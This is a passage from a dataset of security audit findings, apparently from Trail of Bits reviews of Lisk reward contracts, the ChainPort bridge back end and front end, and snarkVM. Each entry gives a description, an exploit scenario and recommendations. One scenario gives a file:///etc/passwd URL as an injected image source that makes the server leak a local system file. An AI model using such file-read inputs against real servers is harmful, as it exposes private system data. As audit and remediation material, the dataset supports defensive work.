duration of 14 days. On day 16, she decides to extend her position by one day. Although her position is extended until day 17, the dailyUnlockedAmounts value is updated for day 15, causing the pendingUnlockAmount, totalAmountLocked, and totalWeight accounting values to be incorrect. Recommendations Short term, x the highlighted line of gure 9.1 by adding the line lockingPosition.expDate = Math.max(lockingPosition.expDate,todayDay()) to the else branch, above the highlighted line. Long term, improve the testing suite by adding unit and fuzz tests that verify that the values of the global state variables are correct.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. Insu\u0000cient event generation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf",
        "body": "Multiple user operations do not emit events. As a result, it will be dicult to review the contracts behavior for correctness once they have been deployed. Events generated during contract execution aid in monitoring, baselining of behavior, and detection of suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions; malfunctioning contracts and attacks could go undetected. The following operations should trigger events:  L2Reward:  createPosition  deletePosition  initiateFastUnlock  increaseLockingAmount  extendDuration  pauseLocking  resumeLockingCountdown  L2Staking:  lockAmount  unlock  initiateFastUnlock  increaseLockingAmount  extendLockingDuration  pauseRemainingLockingDuration  resumeCountdown Exploit Scenario An attacker discovers a vulnerability in the L2Reward contract and modies its execution. Because these actions generate no events, the behavior goes unnoticed until there is follow-on damage, such as nancial loss. Recommendations Short term, add events for all operations that could contribute to a higher level of monitoring and alerting. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. Potential for huge gas consumption in updateGlobalState and calculateRewards ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-lisksmartcontracts-securityreview.pdf",
        "body": "Under certain conditions, the updateGlobalState and calculateRewards functions in the L2Reward contract can consume a substantial amount of gas. First, the calculateRewards function calculates a users rewards by looping over the period between the day the user created the position and the day the user claims their rewards (gure 12.1). The larger this period is, the more gas is consumed. If this period is suciently large, the loop could cause an out-of-gas exception. function calculateRewards(uint256 lockID) public view virtual returns (uint256) { ... for (uint256 d = lastClaimDate[lockID]; d < lastRewardDay; d++) { reward += (weight * dailyRewards[d]) / totalWeights[d]; if (lockingPosition.pausedLockingDuration == 0) { // unlocking period is active, weight is decreasing weight -= lockingPosition.amount; } } return reward; } Figure 12.1: The calculateRewards function in L2Reward.sol#L249287 The updateGlobalState function could consume a signicant amount of gas for a similar reason. The loop iteration in this function depends on the period between the date of the last transaction and the current day (gure 12.2). As a result, the greater the duration, the more expensive the loop becomes and the more gas is consumed. As with the calculateRewards function, a suciently long duration could cause an out-of-gas exception. function updateGlobalState() public virtual { uint256 today = todayDay(); uint256 d = lastTrsDate; if (today <= d) return; uint256 cappedRewards; for (; d < today; d++) { totalWeights[d] = totalWeight; cappedRewards = totalAmountLocked / 365; ... } lastTrsDate = today; } Figure 12.2: The updateGlobalState function in L2Reward.sol#L116145 Recommendations Short term, periodically invoke the updateGlobalState function to keep the date of the last transaction updated. This will ensure the period between the last transaction date and the current date never becomes excessively long. Add the gas consumption concerns for the calculateRewards function to the user-facing documentation so that users are aware of the risks. Long term, maintain regular monitoring of the gas usage of these functions to detect instances in which they consume a signicant amount of gas. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Several secrets checked into source control ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "The chainport-backend repository contains several secrets that are checked into source control. Secrets that are stored in source control are accessible to anyone who has had access to the repository (e.g., former employees or attackers who have managed to gain access to the repository). We used TrueHog to identify these secrets (by running the command trufflehog git file://. in the root directory of the repository). TrueHog found several types of credentials, including the following, which were veried through TrueHogs credential verication checks:  GitHub personal access tokens  Slack access tokens TrueHog also found unveried GitLab authentication tokens and Polygon API credentials. Furthermore, we found hard-coded credentials, such as database credentials, in the source code, as shown in gure 1.1. [REDACTED] Figure 1.1: chainport-backend/env.prod.json#L3-L4 Exploit Scenario An attacker obtains a copy of the source code from a former DcentraLab employee. The attacker extracts the secrets from it and uses them to exploit DcentraLabs database and insert events in the database that did not occur. Consequently, ChainPorts AWS lambdas process the fake events and allow the attacker to steal funds. Recommendations Short term, remove credentials from source control and rotate them. Run TrueHog by invoking the trufflehog git file://. command; if it identies any unveried credentials, check whether they need to be addressed. Long term, consider using a secret management solution such as Vault to store secrets. 2. Same credentials used for staging, test, and production environment databases Severity: Low Diculty: High Type: Conguration Finding ID: TOB-CHPT-2 Target: Database authentication",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Use of error-prone pattern for logging functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "The pattern shown in gure 3.1 is used repeatedly throughout the codebase to log function names. [REDACTED] Figure 3.1: An example of the pattern used by ChainPort to log function names This pattern is prone to copy-and-paste errors. Developers may copy the code from one function to another but forget to change the function name, as exemplied in gure 3.2. [REDACTED] Figure 3.2: An example of an incorrect use of the pattern used by ChainPort to log function names We wrote a Semgrep rule to detect these problems (appendix D). This rule detected 46 errors associated with this pattern in the back-end application. Figure 3.3 shows an example of one of these ndings. [REDACTED] Figure 3.3: An example of one of the 46 errors resulting from the function-name logging pattern (chainport-backend/modules/web_3/helpers.py#L313-L315) Exploit Scenario A ChainPort developer is auditing the back-end application logs to determine the root cause of a bug. Because an incorrect function name was logged, the developer cannot correctly trace the applications ow and determine the root cause in a timely manner. Recommendations Short term, use the Python decorator in gure 3.4 to log function names. This will eliminate the risk of copy-and-paste errors. [REDACTED] Figure 3.4: A Python decorator that logs function names, eliminating the risk of copy-and-paste errors Long term, review the codebase for other error-prone patterns. If such patterns are found, rewrite the code in a way that eliminates or reduces the risk of errors, and write a Semgrep rule to nd the errors before the code hits production.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Use of hard-coded strings instead of constants ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "The back-end code uses several hard-coded strings that could be dened as constants to prevent any typos from introducing vulnerabilities. For example, the checks that determine the systems environment compare the result of the get_env function with the strings develop, staging, prod, or local. Figure 4.1 shows an example of one of these checks. [REDACTED] Figure 4.1: chainport-backend/project/lambdas/mainchain/rebalance_monitor.py#L42-L43 We did not nd any typos in these literal strings, so we set the severity of this nding to informational. However, the use of hard-coded strings in place of constants is not best practice; we suggest xing this issue and following other best practices for writing safe code to prevent the introduction of bugs in the future. Exploit Scenario A ChainPort developer creates code that should run only in the development build and safeguards it with the check in gure 4.2. [REDACTED] Figure 4.2: An example of a check against a hard-coded string that could lead to a vulnerability This test always failsthe correct value to test should have been develop. Now, the poorly tested, experimental code that was meant to run only in development mode is deployed in production. Recommendations Short term, create a constant for each of the four possible environments. Then, to check the systems environment, import the corresponding constant and use it in the comparison instead of the hard-coded string. Alternatively, use an enum instead of a string to perform these comparisons. Long term, review the code for other instances of hard-coded strings where constants could be used instead. Create Semgrep rules to ensure that developers never use hard-coded strings where constants are available.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Use of incorrect operator in SQLAlchemy lter ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "The back-end code uses the is not operator in an SQLAlchemy querys filter. SQLAlchemy relies on the __eq__ family of methods to apply the lter; however, the is and is not operators do not trigger these methods. Therefore, only the comparison operators (== or !=) should be used. [REDACTED] Figure 5.1: chainport-backend/project/data/db/port.py#L173 We did not review whether this aw could be used to bypass the systems business logic, so we set the severity of this issue to undetermined. Exploit Scenario An attacker exploits this awed check to bypass the systems business logic and steal user funds. Recommendations Short term, replace the is not operator with != in the filter indicated above. Long term, to continuously monitor the codebase for reintroductions of this issue, run the python.sqlalchemy.correctness.bad-operator-in-filter.bad-operator-in-f ilter Semgrep rule as part of the CI/CD ow. References  SQLAlchemy: Common Filter Operators  Stack Overow: Select NULL Values in SQLAlchemy",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "6. Several functions receive the wrong number of arguments ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "Several functions in the chainport-backend repository are called with an incorrect number of arguments:  Several functions in the /project/deprecated_files folder  A call to release_tokens_by_maintainer from the rebalance_bridge function (gures 6.1 and 6.2)  A call to generate_redeem_signature from the regenerate_signature function (gures 6.3 and 6.4)  A call to get_next_nonce_for_public_address from the prepare_erc20_transfer_transaction function (gures 6.5 and 6.6)  A call to get_cg_token_address_list from the main function of the le (likely old debugging code) [REDACTED] Figure 6.1: The release_tokens_by_maintainer function is called with four arguments, but at least ve are required. (chainport-backend/project/lambdas/mainchain/rebalance_monitor.py#L109-L1 14) [REDACTED] Figure 6.2: The denition of the release_tokens_by_maintainer function (chainport-backend/project/lambdas/release_tokens_by_maintainer.py#L27-L3 4) [REDACTED] Figure 6.3: A call to generate_redeem_signature that is missing the network_id argument (chainport-backend/project/scripts/keys_maintainers_signature/regenerate_ signature.py#L38-L43) [REDACTED] Figure 6.4: The denition of the generate_redeem_signature function (chainport-backend/project/lambdas/sidechain/events_handlers/handle_burn_ event.py#L46-L48) [REDACTED] Figure 6.5: A call to get_next_nonce_for_public_address that is missing the outer_session argument (chainport-backend/project/web3_cp/erc20/prepare_erc20_transfer_transacti on.py#L32-L34) [REDACTED] Figure 6.6: The denition of the get_next_nonce_for_public_address function (chainport-backend/project/web3_cp/nonce.py#L19-L21) [REDACTED] Figure 6.7: A call to get_cg_token_address_list that is missing all three arguments (chainport-backend/project/lambdas/token_endpoints/cg_list_get.py#L90-91) [REDACTED] Figure 6.8: The denition of the get_cg_token_address_list function (chainport-backend/project/lambdas/token_endpoints/cg_list_get.py#L37) We did not review whether this aw could be used to bypass the systems business logic, so we set the severity of this issue to undetermined. Exploit Scenario The release_tokens_by_maintainer function is called from the rebalance_bridge function with the incorrect number of arguments. As a result, the rebalance_bridge function fails if the token balance is over the threshold limit, and the tokens are not moved to a safe address. An attacker nds another aw and is able to steal more tokens than he would have been able to if the tokens were safely stored in another account. Recommendations Short term, x the errors presented in the description of this nding by adding the missing arguments to the function calls. Long term, run pylint or a similar static analysis tool to detect these problems (and others) before the code is committed and deployed in production. This will ensure that if the list of a functions arguments ever changes (which was likely the root cause of this problem), a call that does not match the new arguments will be agged before the code is deployed.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "7. Lack of events for critical operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "Several critical operations do not trigger events. As a result, it will be dicult to review the correct behavior of the contracts once they have been deployed. For example, the setSignatoryAddress function, which is called in the Validator contract to set the signatory address, does not emit an event providing conrmation of that operation to the contracts caller (gure 7.1). [REDACTED] Figure 7.1: The setSignatoryAddress function in Validator:43-52 Without events, users and blockchain-monitoring systems cannot easily detect suspicious behavior. Exploit Scenario Eve, an attacker, is able to compromise a quorum of the ChainPort congress voters contract. She then sets a new signatory address. Alice, a ChainPort team member, is unaware of the change and does not raise a security incident. Recommendations Short term, add events for all critical operations that result in state changes. Events aid in contract monitoring and the detection of suspicious behavior. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Lack of zero address checks in setter functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "Certain setter functions fail to validate incoming arguments, so callers can accidentally set important state variables to the zero address. For example, in the initialize function of the ChainportMainBridge contract, developers can dene the maintainer registry, the congress address for governance, and the signature validator and set their addresses to the zero address. [REDACTED] Figure 8.1: The initialize function of ChainportMainBridge.sol Failure to immediately reset an address that has been set to the zero address could result in unexpected behavior. Exploit Scenario Alice accidentally sets the ChainPort congress address to the zero address when initializing a new version of the ChainportMainBridge contract. The misconguration causes the system to behave unexpectedly, and the system must be redeployed once the misconguration is detected. Recommendations Short term, add zero-value checks to all constructor functions and for all setter arguments to ensure that users cannot accidentally set incorrect values, misconguring the system. Document any arguments that are intended to be set to the zero address, highlighting the expected values of those arguments on each chain. Long term, use the Slither static analyzer to catch common issues such as this one. Consider integrating a Slither scan into the projects CI pipeline, pre-commit hooks, or build scripts.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Python type annotations are missing from most functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "The back-end code uses Python type annotations; however, their use is sporadic, and most functions are missing them. Exploit Scenario The cg_rest_call function receives the exception argument without specifying its type with a Python type annotation. The get_token_details_by_cg_id function calls cg_rest_call with an object of the incorrect type, an Exception instance instead of an Exception class, causing the program to crash (gure 9.1). [REDACTED] Figure 9.1: chainport-backend/modules/coingecko/api.py#L41-L42 Recommendations Short term, add type annotations to the arguments of every function. This will not prevent the code from crashing or causing undened behavior during runtime; however, it will allow developers to clearly see each arguments expected type and static analyzers to better detect type mismatches. Long term, implement checks in the CI/CD pipeline to ensure that code without type annotations is not accepted.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Use of libraries with known vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "The back-end repository uses outdated libraries with known vulnerabilities. We used pip-audit, a tool developed by with support from Google to audit Python environments and dependency trees for known vulnerabilities, and identied two known vulnerabilities in the projects dependencies (as shown in gure 10.1). [REDACTED] Figure 10.1: A list of outdated libraries in the back-end repository Recommendations Short term, update the projects dependencies to their latest versions wherever possible. Use pip-audit to conrm that no vulnerable dependencies remain. Long term, add pip-audit to the projects CI/CD pipeline. Do not allow builds to succeed with dependencies that have known vulnerabilities.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. Use of JavaScript instead of TypeScript ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "The ChainPort front end is developed with JavaScript instead of TypeScript. TypeScript is a strongly typed language that compiles to JavaScript. It allows developers to specify the types of variables and function arguments, and TypeScript code will fail to compile if there are type mismatches. Contrarily, JavaScript code will crash (or worse) during runtime if there are type mismatches. In summary, TypeScript is preferred over JavaScript for the following reasons:  It improves code readability; developers can easily identify variable types and the types that functions receive.  It improves security by providing static type checking that catches errors during compilation.  It improves support for integrated development environments (IDEs) and other tools by allowing them to reason about the types of variables. Exploit Scenario A bug in the front-end application is missed, and the code is deployed in production. The bug causes the application to crash, preventing users from using it. This bug would have been caught if the front-end application were written in TypeScript. Recommendations Short term, rewrite newer parts of the application in TypeScript. TypeScript can be used side-by-side with JavaScript in the same application, allowing it to be introduced gradually. Long term, gradually rewrite the whole application in TypeScript.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. Use of .format to create SQL queries ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "The back end builds SQL queries with the .format function. An attacker that controls one of the variables that the function is formatting will be able to inject SQL code to steal information or damage the database. [REDACTED] Figure 12.1: chainport-backend/project/data/db/postgres.py#L4-L24 [REDACTED] Figure 12.2: chainport-backend/project/lambdas/database_monitor/clear_lock.py#L29-L31 None of the elds described above are attacker-controlled, so we set the severity of this nding to informational. However, the use of .format to create SQL queries is an anti-pattern; parameterized queries should be used instead. Exploit Scenario A developer copies the vulnerable code to create a new SQL query. This query receives an attacker-controlled string. The attacker conducts a time-based SQL injection attack, leaking the whole database. Recommendations Short term, use parameterized queries instead of building strings with variables by hand. Long term, create or use a static analysis check that forbids this pattern. This will ensure that this pattern is never reintroduced by a less security-aware developer.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "13. Many rules are disabled in the ESLint conguration ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "There are 34 rules disabled in the front-end eslint conguration. Disabling some of these rules does not cause problems, but disabling others reduces the codes security and reliability (e.g., react/no-unescaped-entities, consistent-return, no-shadow) and the codes readability (e.g., react/jsx-boolean-value, react/jsx-one-expression-per-line). Furthermore, the code contains 46 inline eslint-disable comments to disable specic rules. While disabling some of these rules in this way may be valid, we recommend adding a comment to each instance explaining why the specic rule was disabled. Recommendations Short term, create a list of rules that can be safely disabled without reducing the codes security or readability, document the justication, and enable every other rule. Fix any ndings that these rules may report. For rules that are disabled with inline eslint-disable comments, include explanatory comments justifying why they are disabled.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. Congress can lose quorum after manually setting the quorum value ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "Proposals to the ChainPort congress must be approved by a minimum quorum of members before they can be executed. By default, when a new member is added to the congress, the quorum is updated to be N  1, where N is the number of congress members. [REDACTED] Figure 14.1: smart-contracts/contracts/governance/ChainportCongressMembersRegistry.so l#L98-L119 However, the congress has the ability to overwrite the quorum number to any nonzero number, including values larger than the current membership. [REDACTED] Figure 14.2: smart-contracts//contracts/governance/ChainportCongressMembersRegistry.s ol#L69-L77 If the congress manually lowers the quorum number and later adds a member, the quorum number will be reset to one less than the total membership. If for some reason certain members are temporarily or permanently unavailable (e.g., they are on vacation or their private keys were destroyed), the minimum quorum would not be reached. Exploit Scenario The ChainPort congress is composed of 10 members. Alice submits a proposal to reduce the minimum quorum to six members to ensure continuity while several members take vacations over a period of several months. During this period, a proposal to add Bob as a new member of the ChainPort congress is passed while Carol and Dave, two other congress members, are on vacation. This unexpectedly resets the minimum quorum to 10 members of the 11-person congress, preventing new proposals from being passed. Recommendations Short term, rewrite the code so that, when a new member is added to the congress, the minimum quorum number increases by one rather than being updated to the current number of congress members subtracted by one. Add a cap to the minimum quorum number to prevent it from being manually set to values larger than the current membership of the congress. Long term, uncouple operations for increasing and decreasing quorum values from operations for making congress membership changes. Instead, require that such operations be included as additional actions in proposals for membership changes.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Potential race condition could allow users to bypass PORTX fee payments ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "ChainPort fees are paid either as a 0.3% fee deducted from the amount transferred or as a 0.2% fee in PORTX tokens that the user has deposited into the ChainportFeeManager contract. To determine whether a fee should be paid in the base token or in PORTX, the back end checks whether the user has a sucient PORTX balance in the ChainportFeeManager contract. [REDACTED] Figure 15.1: chainport-backend//project/lambdas/fees/fees.py#L219-249 However, the ChainportFeeManager contract does not enforce an unbonding period, a period of time before users can unstake their PORTX tokens. [REDACTED] Figure 15.2: smart-contracts/contracts/ChainportFeeManager.sol#L113-L125 Since pending fee payments are generated as part of deposit, transfer, and burn events but the actual processing is handled by a separate monitor, it could be possible for a user to withdraw her PORTX tokens on-chain after the deposit event has been processed and before the fee payment transaction is conrmed, allowing her to avoid paying a fee for the transfer. Exploit Scenario Alice uses ChainPort to bridge one million USDC from the Ethereum mainnet to Polygon. She has enough PORTX deposited in the ChainportFeeManager contract to cover the $2,000 fee. She watches for the pending fee payment transaction and front-runs it to remove her PORTX from the ChainportFeeManager contract. Her transfer succeeds, but she is not required to pay the fee. Recommendations Short term, add an unbonding period preventing users from unstaking PORTX before the period has passed. Long term, ensure that deposit, transfer, and redemption operations are executed atomically with their corresponding fee payments.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "16. Signature-related code lacks a proper specication and documentation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "ChainPort uses signatures to ensure that messages to mint and release tokens were generated by the back end. These signatures are not well documented, and the properties they attempt to provide are often unclear. For example, answers to the following questions are not obvious; we provide example answers that could be provided in the documentation of ChainPorts use of signatures:  Why does the signed message contain a networkId eld, and why does it have to be unique? If not, an operation to mint tokens on one chain could be replayed on another chain.  Why does the signed message contain an action eld? The action eld prevents replay attacks in networks that have both a main and side bridge. Without this eld, a signature for minting tokens could be used on a sidechain contract of the same network to release tokens.  Why are both the signature and nonce checked for uniqueness in the contracts? The signatures could be represented in more than one format, which means that storing them is not enough to ensure uniqueness. Recommendations Short term, create a specication describing what the signatures protect against, what properties they attempt to provide (e.g., integrity, non-repudiation), and how these properties are provided.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. Cryptographic primitives lack sanity checks and clear function names ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "Several cryptographic primitives are missing sanity checks on their inputs. Without such checks, problems could occur if the primitives are used incorrectly. The remove_0x function (gure 17.1) does not check that the input starts with 0x. A similar function in the eth-utils library has a more robust implementation, as it includes a check on its input (gure 17.2). [REDACTED] Figure 17.1: chainport-backend/modules/cryptography_2key/signatures.py#L10-L16 [REDACTED] Figure 17.2: ethereum/eth-utils/eth_utils/hexadecimal.py#L43-L46 The add_leading_0 function's name does not indicate that the value is padded to a length of 64 (gure 17.3). [REDACTED] Figure 17.3: chainport-backend/modules/cryptography_2key/signatures.py#L19-L25 The _build_withdraw_message function does not ensure that the beneficiary_address and token_address inputs have the expected length of 66 bytes and that they start with 0x (gure 17.4). [REDACTED] Figure 17.4: chainport-backend/modules/cryptography_2key/signatures.py#L28-62 We did not identify problems in the way these primitives are currently used in the code, so we set the severity of this nding to informational. However, if the primitives are used improperly in the future, cryptographic bugs that can have severe consequences could be introduced, which is why we highly recommend xing the issues described in this nding. Exploit Scenario A developer fails to understand the purpose of a function or receives an input from outside the system that has an unexpected format. Because the functions lack sanity checks, the code fails to do what the developer expected. This leads to a cryptographic vulnerability and the loss of funds. Recommendations Short term, add the missing checks and x the naming issues described above. Where possible, use well-reviewed libraries rather than implementing cryptographic primitives in-house. Long term, review all the cryptographic primitives used in the codebase to ensure that the functions purposes are clear and that functions perform sanity checks, preventing them from being used improperly. Where necessary, add comments to describe the functions purposes.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "18. Use of requests without the timeout argument ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "The Python requests library is used in the ChainPort back end without the timeout argument. By default, the requests library will wait until the connection is closed before fullling a request. Without the timeout argument, the program will hang indenitely. The following locations in the back-end code are missing the timeout argument:  chainport-backend/modules/coingecko/api.py#L29  chainport-backend/modules/requests_2key/requests.py#L14  chainport-backend/project/stats/cg_prices.py#L74  chainport-backend/project/stats/cg_prices.py#L95 The code in these locations makes requests to the following websites:  https://api.coingecko.com  https://ethgasstation.info  https://gasstation-mainnet.matic.network If any of these websites hang indenitely, so will the back-end code. Exploit Scenario One of the requested websites hangs indenitely. This causes the back end to hang, and token ports from other users cannot be processed. Recommendations Short term, add the timeout argument to each of the code locations indicated above. This will ensure that the code will not hang if the website being requested hangs. Long term, integrate Semgrep into the CI pipeline to ensure that uses of the requests library always have the timeout argument.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "19. Lack of noopener attribute on external links ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "In the ChainPort front-end application, there are links to external websites that have the target attribute set to _blank but lack the noopener attribute. Without this attribute, an attacker could perform a reverse tabnabbing attack. [REDACTED] Figure 19.1: chainport-app/src/modules/exchange/components/PortOutModal.jsx#L126 Exploit Scenario An attacker takes control of one of the external domains linked by the front end. The attacker prepares a malicious script on the domain that uses the window.opener variable to control the parent windows location. A user clicks on the link in the ChainPort front end. The malicious website is opened in a new window, and the original ChainPort front end is seamlessly replaced by a phishing website. The victim then returns to a page that appears to be the original ChainPort front end but is actually a web page controlled by the attacker. The attacker tricks the user into transferring his funds to the attacker. Recommendations Short term, add the missing rel=\"noopener noreferrer\" attribute to the anchor tags. References  OWASP: Reverse tabnabbing attacks",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "20. Use of urllib could allow users to leak local les ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "To upload images of new tokens to S3, the upload_media_from_url_to_s3 function uses the urllib library (gure 20.1), which supports the file:// scheme; therefore, if a malicious actor controls a dynamic value uploaded to S3, she could read arbitrary local les. [REDACTED] Figure 20.1: chainport-backend/modules/infrastructure/aws/s3.py#L25-29 The code in gure 20.2 replicates this issue. [REDACTED] Figure 20.2: Code to test urlopens support of the file:// scheme We set the severity of this nding to undetermined because it is unclear whether an attacker (e.g., a token owner) would have control over token images uploaded to S3 and whether the server holds les that an attacker would want to extract. Exploit Scenario A token owner makes the image of his token point to a local le (e.g., file:///etc/passwd). This local le is uploaded to the S3 bucket and is shown to an attacker attempting to port his own token into the ChainPort front end. The local le is leaked to the attacker. Recommendations Short term, use the requests library instead of urllib. The requests library does not support the file:// scheme.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "21. The front end is vulnerable to iFraming ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "The ChainPort front end does not prevent other websites from iFraming it. Figure 21.1 shows an example of how another website could iFrame the ChainPort front end. [REDACTED] Figure 21.1: An example of how another website could iFrame the ChainPort front end Exploit Scenario An attacker creates a website that iFrames ChainPorts front end. The attacker performs a clickjacking attack to trick users into submitting malicious transactions. Recommendations Short term, add the X-Frame-Options: DENY header on every server response. This will prevent other websites from iFraming the ChainPort front end.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "22. Lack of CSP header in the ChainPort front end ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-chainport-securityreview.pdf",
        "body": "The ChainPort front end lacks a Content Security Policy (CSP) header, leaving it vulnerable to cross-site scripting (XSS) attacks. A CSP header adds extra protection against XSS and data injection attacks by enabling developers to select the sources that the browser can execute or render code from. This safeguard requires the use of the CSP HTTP header and appropriate directives in every server response. Exploit Scenario An attacker nds an XSS vulnerability in the ChainPort front end and crafts a custom XSS payload. Because of the lack of a CSP header, the browser executes the attack, enabling the attacker to trick users into transferring their funds to him. Recommendations Short term, use a CSP header in the ChainPort front end and validate it with the CSP Evaluator. This will help mitigate the eects of XSS attacks. Long term, track the development of the CSP header and similar web browser features that help mitigate security risks. Ensure that new protections are adopted as quickly as possible. References  HTTP Content Security Policy (CSP)  Google CSP Evaluator  Google Web Security Fundamentals: Eval  Google Web Security Fundamentals: Inline code is considered harmful",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Consoles Field and Scalar divisions panic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "The division operation of the Field and Scalar types do not guard against a division by zero. This causes a runtime panic when values from these types are divided by zero. Figure 1.1 shows a test and the respective stack backtrace, where a None option is unconditionally unwrapped in snarkvm/fields/src/fp_256.rs : #[test] fn test_div () { let zero = Field::<CurrentEnvironment>::zero(); // Sample a new field. let num = Field::<CurrentEnvironment>::new(Uniform::rand(& mut test_rng())); // Divide by zero let neg = num.div(zero); } // running 1 test // thread 'arithmetic::tests::test_div' panicked at 'called `Option::unwrap()` on a `None` value', /snarkvm/fields/src/fp_256.rs:709:42 // stack backtrace: // 0: rust_begin_unwind // at /rustc/v/library/std/src/panicking.rs:584:5 // 1: core::panicking::panic_fmt // at /rustc/v/library/core/src/panicking.rs:142:14 // 2: core::panicking::panic // at /rustc/v/library/core/src/panicking.rs:48:5 // 3: core::option::Option<T>::unwrap // at /rustc/v/library/core/src/option.rs:755:21 // 4: <snarkvm_fields::fp_256::Fp256<P> as core::ops::arith::DivAssign<&snarkvm_fields::fp_256::Fp256<P>>>::div_assign // at snarkvm/fields/src/fp_256.rs:709:26 // 5: <snarkvm_fields::fp_256::Fp256<P> as core::ops::arith::Div>::div // at snarkvm/fields/src/macros.rs:524:17 // 6: snarkvm_console_types_field::arithmetic::<impl core::ops::arith::Div for snarkvm_console_types_field::Field<E>>::div // at ./src/arithmetic.rs:143: // 7: snarkvm_console_types_field::arithmetic::tests::test_div // at ./src/arithmetic.rs:305:23 Figure 1.1: Test triggering the division by zero The same issue is present in the Scalar type, which has no zero-check for other : impl <E: Environment > Div<Scalar<E>> for Scalar<E> { type Output = Scalar<E>; /// Returns the `quotient` of `self` and `other`. #[inline] fn div ( self , other: Scalar <E>) -> Self 